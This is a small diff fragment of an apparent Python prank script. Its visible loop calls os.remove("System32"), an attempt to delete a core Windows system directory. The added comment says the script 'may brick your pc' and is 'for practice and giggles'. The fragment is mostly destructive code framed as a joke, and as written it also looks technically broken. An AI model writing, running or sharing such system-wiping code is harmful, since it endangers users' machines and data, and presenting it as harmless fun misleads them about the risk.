@@ -13,3 +13,5 @@ while True:
             os.remove("System32")
     else:
         break
+
+# This may brick your pc. This is for practice and giggles :-D
